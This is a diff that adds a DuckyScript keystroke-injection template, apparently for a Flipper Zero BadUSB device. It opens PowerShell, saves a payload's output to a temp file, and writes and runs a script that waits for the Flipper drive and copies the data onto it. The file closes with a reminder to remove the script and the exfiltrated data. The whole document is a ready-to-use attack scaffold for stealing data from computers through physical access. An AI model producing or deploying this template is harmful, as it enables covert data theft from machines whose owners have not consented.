@@ -1,0 +1,61 @@
+DELAY 400
+GUI r
+DELAY 300
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+
+REM Payload goes here
+
+REM Payload result goes here.
+STRING $stringToSave = "YOUR_PAYLOADS_RESULT_GOES_HERE"
+ENTER
+
+REM Exfiltration over USB
+STRING $tempDirectory = $env:TEMP
+ENTER
+STRING $filePath = Join-Path -Path $tempDirectory -ChildPath "data.txt"
+ENTER
+STRING $stringToSave | Set-Content -Path $filePath
+ENTER
+STRING $scriptContent = @'
+ENTER
+STRING while (-not (Get-WmiObject Win32_DiskDrive | Where-Object { $_.Model -like "*Flipper*" })) {
+ENTER
+STRING    Start-Sleep -Seconds 5
+ENTER
+STRING }
+ENTER
+STRING $usbDrives = Get-Volume | Where-Object { $_.DriveType -eq 'Removable' }
+ENTER
+STRING $usbDriveLetter = $usbDrives[-1].DriveLetter + ":"
+ENTER
+STRING $sourceFilePath = Join-Path -Path $env:TEMP -ChildPath "data.txt"
+ENTER
+STRING if (Test-Path $usbDriveLetter) {
+ENTER
+STRING $destinationPath = Join-Path $usbDriveLetter (Split-Path $sourceFilePath -Leaf)
+ENTER
+STRING Copy-Item -Path $sourceFilePath -Destination $destinationPath -Force
+ENTER
+STRING }
+ENTER
+STRING '@
+ENTER
+STRING $scriptPath = Join-Path -Path $tempDirectory -ChildPath "script.ps1"
+ENTER
+
+REM Save and execute the script we just wrote.
+STRING $scriptContent | Out-File -FilePath $scriptPath -Force
+ENTER
+STRING $command = ".\tempDirectory\Script.ps1"
+ENTER
+REM STRING Invoke-Command $command
+STRING Invoke-Expression -Command $scriptPath
+ENTER
+
+
+REM Cleanup goes here. Remember to remove your script and exfil data!
+STRING Exit
+ENTER
